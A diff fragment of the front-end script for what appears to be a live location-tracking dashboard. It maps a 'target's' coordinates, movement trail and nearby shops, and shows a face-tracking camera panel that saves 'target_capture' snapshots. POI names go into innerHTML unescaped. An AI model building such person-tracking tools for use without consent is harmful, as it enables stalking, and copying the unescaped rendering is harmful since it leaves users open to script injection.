+        geoCountry.textContent = geo.country || '--';
+        geoCoords.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+
+        const gmapsUrl = geo.google_maps_url || `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+        const directionsUrl = geo.google_directions_url || `https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`;
+
+        btnOpenGmaps.href = gmapsUrl;
+        btnGmapsDirections.href = directionsUrl;
+      }
+
+      function renderNearbyPOI(poiListArray) {
+        if (!Array.isArray(poiListArray)) return;
+
+        // Clear existing map POI markers
+        state.poiMarkers.forEach(m => map.removeLayer(m));
+        state.poiMarkers = [];
+
+        poiCountChip.textContent = `${poiListArray.length} Found`;
+        poiList.innerHTML = '';
+
+        if (poiListArray.length === 0) {
+          poiList.innerHTML = '<div style="font-size: 11px; color:#70757a; text-align:center; padding:8px;">No petrol bunks or shops found within 1.5km.</div>';
+          return;
+        }
+
+        poiListArray.forEach(p => {
+          // Icon by category
+          let iconChar = '📍';
+          let pinClass = 'poi-map-pin';
+          if (p.type === 'petrol') {
+            iconChar = '⛽';
+            pinClass += ' petrol';
+          } else if (p.type === 'shop') {
+            iconChar = '🏪';
+            pinClass += ' shop';
+          } else if (p.type === 'medical') {
+            iconChar = '🏥';
+          }
+
+          // Add POI marker to Map
+          const poiIcon = L.divIcon({
+            className: 'custom-poi-marker',
+            html: `<div class="${pinClass}">${iconChar}</div>`,
+            iconSize: [28, 28],
+            iconAnchor: [14, 14]
+          });
+
+          const poiMarker = L.marker([p.lat, p.lng], { icon: poiIcon }).addTo(map);
+          poiMarker.bindPopup(`
+            <div style="font-family:sans-serif; font-size:12px; line-height:1.4;">
+              <b>${iconChar} ${p.name}</b><br/>
+              <span style="color:#70757a; font-size:10.5px;">${p.label} • ${p.distance_m}m away</span><br/>
+              <a href="${p.gmaps_url}" target="_blank" style="color:#1a73e8; font-weight:600; text-decoration:none;">Open in Google Maps ➔</a>
+            </div>
+          `);
+          state.poiMarkers.push(poiMarker);
+
+          // Add to Drawer List
+          const itemEl = document.createElement('div');
+          itemEl.className = 'poi-item';
+          itemEl.innerHTML = `
+            <div class="poi-info">
+              <span class="poi-icon">${iconChar}</span>
+              <span class="poi-name" title="${p.name}">${p.name}</span>
+            </div>
+            <span class="poi-dist">${p.distance_m} m</span>
+          `;
+          itemEl.addEventListener('click', () => {
+            map.setView([p.lat, p.lng], 18, { animate: true });
+            poiMarker.openPopup();
+          });
+          poiList.appendChild(itemEl);
+        });
+      }
+
+      // Elapsed time ticker
+      setInterval(() => {
+        if (!state.lastPingTime) return;
+        const now = new Date();
+        const diffSec = Math.floor((now - state.lastPingTime) / 1000);
+        const ageEl = document.getElementById('valAge');
+        if (ageEl) {
+          if (diffSec < 2) ageEl.textContent = 'just now';
+          else if (diffSec < 60) ageEl.textContent = `${diffSec}s ago`;
+          else ageEl.textContent = `${Math.floor(diffSec / 60)}m ago`;
+        }
+      }, 1000);
+
+      // Center Follow Toggle
+      function updateCenterButtonUI() {
+        if (state.autoFollow) {
+          btnCenter.classList.add('active');
+          centerBtnText.textContent = 'Following';
+        } else {
+          btnCenter.classList.remove('active');
+          centerBtnText.textContent = 'Center';
+        }
+      }
+
+      btnCenter.addEventListener('click', () => {
+        state.autoFollow = true;
+        stopOrbit();
+        updateCenterButtonUI();
+        if (state.currentPosition) {
+          const currentZoom = Math.max(map.getZoom(), CONFIG.defaultZoom);
+          map.setView(state.currentPosition, currentZoom, { animate: true });
+        }
+      });
+
+      btnClearTrail.addEventListener('click', () => {
+        state.trailCoordinates = [];
+        trailGlow.setLatLngs([]);
+        trailCore.setLatLngs([]);
+      });
+
+      // Panel Minimizers
+      document.getElementById('btnToggleGmapsCard').addEventListener('click', function() {
+        const card = document.getElementById('gmapsCard');
+        card.classList.toggle('collapsed');
+        this.textContent = card.classList.contains('collapsed') ? '▲' : '▼';
+      });
+
+      document.getElementById('btnToggleFacePanel').addEventListener('click', function() {
+        const panel = document.getElementById('faceTrackPanel');
+        panel.classList.toggle('minimized');
+        this.textContent = panel.classList.contains('minimized') ? '□' : '_';
+      });
+
+      // Save Snapshot
+      btnSaveSnapshot.addEventListener('click', () => {
+        if (!faceFeedImg.src || faceFeedImg.style.display === 'none') {
+          alert('No target camera snapshot captured yet.');
+          return;
+        }
+        const a = document.createElement('a');
+        a.href = faceFeedImg.src;
+        a.download = `target_capture_${Date.now()}.jpg`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      });
+
+    })();
+  </script>
+</body>
+</html>
